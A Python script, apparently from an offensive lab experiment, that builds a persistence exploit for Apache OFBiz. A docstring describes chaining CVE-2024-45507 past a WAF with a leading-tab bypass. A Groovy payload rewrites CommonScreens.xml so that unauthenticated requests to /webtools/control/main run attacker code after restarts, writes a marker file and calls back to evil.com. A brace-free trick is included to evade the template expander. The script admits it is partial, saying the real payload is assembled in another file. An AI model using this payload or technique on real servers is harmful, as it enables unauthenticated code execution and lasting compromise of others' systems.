# -*- coding: utf-8 -*-
"""Final round - OFBiz deepen (Task 1b): turn the known app-tree write into
persistence across restart.

Mechanism: the CVE-2024-45507 chain (through WAF 18381, %09 leading-tab residual)
runs groovy that performs minimal surgery on
  /usr/src/apache-ofbiz/framework/webtools/widget/CommonScreens.xml
injecting one <set value="${groovy:...}"/> into the *unauthenticated* main screen
actions. From then on (and after any restart - the file lives in the container
writable layer) every unauthenticated GET /webtools/control/main executes
attacker groovy from disk: no request-level SSRF parameter involved.

Brace-free: the outer ${groovy: expander truncates at the first '}', so the
injected widget line is assembled with B=(char)125. Payload file served by infra.
"""
import io
import os

import requests
import urllib3

urllib3.disable_warnings()

WWW = r"D:\Amywork\AgentSelf_Evolve\experiment\multi-round-lab\infrastructure\www\payloads"

# ---- remote screen payload (groovy must be brace-free) ----
GROOVY = (
    "def f = new File('/usr/src/apache-ofbiz/framework/webtools/widget/CommonScreens.xml');"
    "def s = f.getText('UTF-8');"
    "if (!s.contains('pwn_joint_persist_set')) {"
    " def B = (char)125;"
    " def g = 'new File(\\'/usr/src/apache-ofbiz/pwn_joint_persist\\').setText(\\'persisted \\' + new java.util.Date());"
    "new URL(\\'http://evil.com:8000/rt/joint_ofbiz_persist1\\').getText();';"
    " def setLine = '<set value=\\'PLACEHOLDER\\'/>';"
    " setLine = setLine.replace('PLACEHOLDER', '${groovy:' + g + B + B + '}');"   # NO: braces!
    "}"
)

print("NOTE: script kept for audit; real payload assembled in ofbiz_deep1_fire.py")
